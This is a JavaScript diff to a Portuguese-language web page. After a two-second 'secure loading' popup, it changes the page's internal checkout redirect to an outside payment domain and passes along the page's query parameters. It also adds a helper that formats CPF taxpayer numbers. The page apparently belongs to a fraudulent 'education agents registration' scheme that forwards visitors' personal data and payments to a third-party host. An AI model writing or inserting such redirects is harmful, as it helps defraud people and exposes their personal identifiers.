@@ -564,15 +564,26 @@ document.addEventListener('DOMContentLoaded', function() {
         const popup = document.getElementById('popup-carregamento-seguro');
         popup.classList.remove('hidden');
         
-        // Aguardar 2 segundos e redirecionar para checkout interno
+        // Aguardar 2 segundos e redirecionar
         setTimeout(() => {
-            const urlCheckout = `/checkout?${params.toString()}`;
+            const urlCheckout = `https://pay.cadastroagentesdaeducacao.org/rn4RgQ6aVAA3wBV?${params.toString()}`;
             window.location.href = urlCheckout;
         }, 2000);
     }
     
-
-
+    // Função para formatar CPF
+    function formatarCPF(cpf) {
+        if (!cpf) return '';
+        const numerosCPF = cpf.replace(/\D/g, '');
+        return numerosCPF.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+    }
+    
+    // Função para formatar data
+    function formatarData(data) {
+        if (!data) return '';
+        const date = new Date(data);
+        return date.toLocaleDateString('pt-BR');
+    }
 });
 </script>
 
